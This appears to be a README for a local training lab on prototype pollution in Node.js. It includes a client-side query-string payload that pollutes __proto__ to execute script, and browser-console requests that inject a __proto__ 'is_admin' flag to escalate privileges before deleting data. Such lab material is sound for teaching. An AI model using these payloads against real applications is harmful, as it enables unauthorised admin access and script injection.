# Prototype Pollution

## Prerequisite

- [NodeJS](https://nodejs.org/en/) v16.x or latest

Install npm packages
```bash
$ npm install
```

Running the server
```bash
$ npm start
```

## Client Side Prototype Pollution

`?__proto__[props][][value]=1&__proto__[name]=": ''.constructor.constructor('alert(`polluted`)')(),"`

## Server Side Prototype Pollution

Open `Developer tools` in the browser and just insert code below on `Console` tab

Step 1: Post data
```js
useFetch({
  url: '/api',
  method: 'POST',
  headers: {
    'Content-type': 'application/json'
  },
  data: JSON.stringify({
    user: {
      name: 'user',
      password: '1234'
    },
    blog: {
      title: 'Post 1',
      text: 'The blog post 1'
    }
  }),
  callback: (_xhr, success) => {
    console.log('success =>', success)
  }
});
```


Step 2: Delete data 
```js
useFetch({
  url: '/api',
  method: 'DELETE',
  headers: {
    'Content-type': 'application/json'
  },
  data: JSON.stringify({
    user: {
      name: "user",
      password: "1234"
    },
    blog: 1
  }),
  callback: (_xhr, success) => {
    console.log('success =>', success)
  }
});
```


Step 3: Post data with `__proto__` key
```js
useFetch({
  url: '/api',
  method: 'POST',
  headers: {
    'Content-type': 'application/json'
  },
  data: JSON.stringify({
    user: {
      name: 'user',
      password: '1234'
    },
    blog: {
      title: 'Post 2',
      text: 'The blog post 2',
      ['__proto__']: {
        is_admin: true
      }
    }
  }),
  callback: (_xhr, success) => {
    console.log('success =>', success)
  }
});
```

Repeat step 2

```js
const createUrlParams = (data) => {
  const getPairs = (obj, keys = []) => {
    return Object.entries(obj).reduce((pairs, [key, value]) => {
      if (typeof value === "object") {
        pairs.push(...getPairs(value, [...keys, key]));
      } else {
        pairs.push([[...keys, key], value]);
      }
      return pairs;
    }, []);
  };

  let mapped = getPairs(data).map(([[key, ...keysRest], value]) => {
    return `${key}${keysRest.map((k) => `[${k}]`).join("")}=${value}`;
  });

  return mapped.join("&");
};
```
